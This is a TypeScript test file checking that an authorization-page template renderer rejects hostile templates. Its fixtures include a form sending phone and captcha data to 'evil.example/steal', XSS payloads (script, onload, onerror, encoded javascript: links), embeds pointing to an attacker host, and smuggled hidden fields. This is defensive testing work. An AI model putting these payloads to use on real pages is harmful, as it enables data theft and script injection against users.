import { describe, expect, it } from "vitest";
import {
  authorizeTemplateNames,
  buyerAuthorizeSubmit,
  prepareAuthorizeStep,
  type AuthorizeStepRender,
} from "./authorize";

const captchaMountId = "merclink-authorize-captcha";

const phoneDocument = `
  <template data-merclink="authorize.phone">
    <form action="https://evil.example/steal" method="get">
      <input name="phone" value="13800000000">
      <input name="captchaVerifyParam" value="baked-token">
      <merclink-slot name="authorize.captcha"></merclink-slot>
      <merclink-slot name="authorize.notice"></merclink-slot>
      <button id="captcha-send" type="submit" disabled formaction="https://evil.example/other">发送验证码</button>
    </form>
    <p>验证码是 123456</p>
    <p>登录成功</p>
  </template>
`;

function render(
  html: string,
  overrides: Partial<AuthorizeStepRender> = {},
): ReturnType<typeof prepareAuthorizeStep> {
  return prepareAuthorizeStep(html, {
    templateName: authorizeTemplateNames.phone,
    submitAction: buyerAuthorizeSubmit,
    notice: "请完成人机验证。",
    phone: "",
    mode: "register",
    accountName: "",
    accountPhone: "",
    pendingApproval: false,
    bindPhone: false,
    clearPhoneValue: true,
    intent: "sms",
    requireCaptchaSlot: true,
    devStubs: false,
    captchaToken: "",
    ...overrides,
  });
}

describe("authorize step appearance", () => {
  it("renders only the current step and does not trust template scripts or codes", () => {
    const appearance = render(phoneDocument);
    expect(appearance?.injectCaptcha).toBe(true);
    expect(appearance?.html).toContain('id="merclink-authorize-captcha"');
    expect(appearance?.html).toContain('action="/authorize/buyer/submit"');
    expect(appearance?.html).toContain('method="post"');
    expect(appearance?.html).toContain('formaction="/authorize/buyer/submit"');
    expect(appearance?.html).toContain('value="sms"');
    expect(appearance?.html).toContain("请完成人机验证。");
    expect(appearance?.html).not.toContain("evil.example");
    expect(appearance?.html).not.toContain("123456");
    expect(appearance?.html).not.toContain("baked-token");
    expect(appearance?.html).not.toContain("登录成功");
    expect(appearance?.html).not.toContain('value="13800000000"');
    const form = appearance?.html.indexOf("<form") ?? -1;
    const mount = appearance?.html.indexOf(captchaMountId) ?? -1;
    const end = appearance?.html.indexOf("</form>") ?? -1;
    expect(form).toBeGreaterThanOrEqual(0);
    expect(form).toBeLessThan(mount);
    expect(mount).toBeLessThan(end);
    const withFields = render(phoneDocument, {
      captchaMarkup: '<div id="captcha-element"></div>',
    });
    const fields = withFields?.html ?? "";
    expect(fields.indexOf("<form")).toBeLessThan(fields.indexOf("captcha-element"));
    expect(fields.indexOf("captcha-element")).toBeLessThan(fields.indexOf("</form>"));
    expect(fields.indexOf(captchaMountId)).toBe(fields.lastIndexOf(captchaMountId));
  });

  it("falls back instead of stripping scripts, event handlers, or dangerous URLs", () => {
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><script>alert(1)</script><merclink-slot name="authorize.captcha"></merclink-slot><button type="submit">发送</button></form></template>',
      ),
    ).toBeNull();
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><svg/onload=alert(1)></svg><merclink-slot name="authorize.captcha"></merclink-slot><button type="submit">发送</button></form></template>',
      ),
    ).toBeNull();
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><img/onerror=alert(1)><merclink-slot name="authorize.captcha"></merclink-slot><button type="submit">发送</button></form></template>',
      ),
    ).toBeNull();
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><a href="javascript&#58;alert(1)">x</a><merclink-slot name="authorize.captcha"></merclink-slot><button type="submit">发送</button></form></template>',
      ),
    ).toBeNull();
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><a href="javascript&colon;alert(1)">x</a><merclink-slot name="authorize.captcha"></merclink-slot><button type="submit">发送</button></form></template>',
      ),
    ).toBeNull();
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><iframe src="https://evil.example"></iframe><merclink-slot name="authorize.captcha"></merclink-slot></form></template>',
      ),
    ).toBeNull();
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><base href="https://evil.example/"><object data="https://evil.example"></object><embed src="https://evil.example"><meta http-equiv="refresh"><merclink-slot name="authorize.captcha"></merclink-slot></form></template>',
      ),
    ).toBeNull();
  });

  it("does not let another control or a comment bind server fields", () => {
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><textarea name="phone">13900000000</textarea><select name="intent"><option>approve</option></select><button name="code" value="000000" type="submit">go</button><merclink-slot name="authorize.captcha"></merclink-slot></form></template>',
      ),
    ).toBeNull();
    const commented = render(
      `
        <template data-merclink="authorize.code">
          <form>
            <!-- <input type="hidden" name="phone" value="13900000000"> -->
            <!-- name="intent" value="approve" -->
            <button type="submit">核验</button>
          </form>
        </template>
      `,
      {
        templateName: authorizeTemplateNames.code,
        phone: "13800138000",
        bindPhone: true,
        clearPhoneValue: false,
        intent: "check",
        requireCaptchaSlot: false,
      },
    );
    expect(commented).not.toBeNull();
    expect(commented?.html).toContain('name="phone" value="13800138000"');
    expect(commented?.html).toContain('value="check"');
    expect(commented?.html).not.toContain("13900000000");
    expect(commented?.html).not.toContain("<!--");
  });

  it("falls back when the captcha mount is outside the form or duplicated", () => {
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><button type="submit">发送</button></form><merclink-slot name="authorize.captcha"></merclink-slot></template>',
      ),
    ).toBeNull();
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><merclink-slot name="authorize.captcha"></merclink-slot><merclink-slot name="authorize.captcha"></merclink-slot><button type="submit">发送</button></form></template>',
      ),
    ).toBeNull();
    expect(
      render(
        '<template data-merclink="authorize.phone"><div id="merclink-authorize-captcha"></div><form><merclink-slot name="authorize.captcha"></merclink-slot><button type="submit">发送</button></form></template>',
      ),
    ).toBeNull();
  });

  it("falls back when the captcha slot, template, or form is missing", () => {
    expect(
      render(
        '<template data-merclink="authorize.phone"><form><input name="phone"></form></template>',
      ),
    ).toBeNull();
    expect(render("<p>no template</p>")).toBeNull();
    expect(
      render(
        '<template data-merclink="authorize.phone"><merclink-slot name="authorize.captcha"></merclink-slot></template>',
      ),
    ).toBeNull();
  });

  it("binds the server phone and ignores a hardcoded code on later steps", () => {
    const html = `
      <template data-merclink="authorize.code">
        <form action="/elsewhere">
          <input type="hidden" name="phone" value="13900000000">
          <input name="code" value="000000">
          <p>核验 <merclink-slot name="authorize.phone"></merclink-slot></p>
        </form>
        <p>验证码填写 654321</p>
      </template>
    `;
    const appearance = render(html, {
      templateName: authorizeTemplateNames.code,
      notice: "验证码已发送。",
      phone: "13800138000",
      bindPhone: true,
      clearPhoneValue: false,
      intent: "check",
      requireCaptchaSlot: false,
    });
    expect(appearance?.injectCaptcha).toBe(false);
    expect(appearance?.html).toContain('value="13800138000"');
    expect(appearance?.html).not.toContain("13900000000");
    expect(appearance?.html).not.toContain("000000");
    expect(appearance?.html).not.toContain("654321");
    expect(appearance?.html).toContain("验证码已发送。");
    expect(appearance?.html).toContain('value="check"');
  });

  it("keeps a server success notice that the template must not invent", () => {
    const html = `
      <template data-merclink="authorize.password">
        <merclink-mode name="register"><form><input type="hidden" name="intent" value="register"></form></merclink-mode>
        <merclink-mode name="login"><form><input type="hidden" name="intent" value="register"></form><p>授权成功</p></merclink-mode>
      </template>
    `;
    const appearance = render(html, {
      templateName: authorizeTemplateNames.password,
      notice: "登录成功，请批准。",
      phone: "13800138000",
      mode: "login",
      bindPhone: true,
      clearPhoneValue: false,
      intent: "password",
      requireCaptchaSlot: false,
    });
    expect(appearance?.html).toContain("登录成功，请批准。");
    expect(appearance?.html).not.toContain("授权成功");
    expect(appearance?.html).toContain('value="password"');
    expect(appearance?.html).not.toContain("merclink-mode");
    expect(appearance?.html).toContain('name="phone" value="13800138000"');
  });

  it("drops the approve control when no interaction is pending", () => {
    const html = `
      <template data-merclink="authorize.approve">
        <merclink-pending name="approve"><form><input type="hidden" name="intent" value="approve"></form></merclink-pending>
        <merclink-idle name="approve"><form><input type="hidden" name="intent" value="logout"></form></merclink-idle>
      </template>
    `;
    const idle = render(html, {
      templateName: authorizeTemplateNames.approve,
      pendingApproval: false,
      intent: null,
      requireCaptchaSlot: false,
      clearPhoneValue: false,
    });
    expect(idle?.html).toContain('value="logout"');
    expect(idle?.html).not.toContain('value="approve"');
    const pending = render(html, {
      templateName: authorizeTemplateNames.approve,
      pendingApproval: true,
      intent: null,
      requireCaptchaSlot: false,
      clearPhoneValue: false,
    });
    expect(pending?.html).toContain('value="approve"');
    expect(pending?.html).not.toContain('value="logout"');
  });

  it("injects a dev-stub captcha token without leaving the send button disabled", () => {
    const appearance = render(phoneDocument, { devStubs: true, captchaToken: "stub-token" });
    expect(appearance?.injectCaptcha).toBe(false);
    expect(appearance?.html).toContain('name="captchaVerifyParam" value="stub-token"');
    expect(appearance?.html).not.toContain('id="merclink-authorize-captcha"');
    expect(appearance?.html).not.toMatch(/id="captcha-send"[^>]*disabled/);
  });
});
